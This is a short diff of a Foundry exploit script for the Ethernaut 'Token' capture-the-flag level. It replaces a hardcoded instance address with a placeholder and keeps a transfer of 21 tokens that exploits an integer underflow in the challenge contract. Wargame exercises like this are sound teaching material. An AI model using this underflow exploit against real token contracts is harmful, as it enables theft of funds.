@@ -5,16 +5,12 @@ import "forge-std/Script.sol";
 import "../src/Ethernaut Challenge/05_Token.sol";
 
 contract ExploitScript is Script {
-    
-    address myAddress = vm.envAddress("ACCOUNT_ADDRESS");
-    Token level05 = Token(0xcfA4F5B338e71e095Be602eEef8a91e25aE29f44);
+    Token level05 = Token(your_challenge_address);
 
     function run() external {
         vm.startBroadcast();
 
-        level05.balanceOf(myAddress);
-        level05.transfer(0xcfA4F5B338e71e095Be602eEef8a91e25aE29f44, 21);
-        level05.balanceOf(myAddress);
+        level05.transfer(your_challenge_address, 21);
 
         vm.stopBroadcast();
     }
